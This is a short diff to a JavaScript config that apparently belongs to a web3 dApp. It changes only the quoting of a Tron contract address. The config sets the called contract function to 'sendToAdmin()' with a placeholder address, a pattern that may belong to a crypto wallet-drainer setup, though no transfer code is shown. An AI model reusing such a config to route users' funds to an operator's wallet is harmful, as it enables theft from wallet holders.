@@ -25,7 +25,7 @@ const config = {
         icons: ['https://avatars.githubusercontent.com/u/179229932']
     },
     // ---- Tron Configs ----
-    tronContractAddress: 'TJpaozAc7EioXybLdgvjgx5vMVojrcjEh7', // Replace with your contract address
+    tronContractAddress: "TJpaozAc7EioXybLdgvjgx5vMVojrcjEh7", // Replace with your contract address
     tronFunctionName: 'sendToAdmin()',
     tronFunctionParams: []
 }
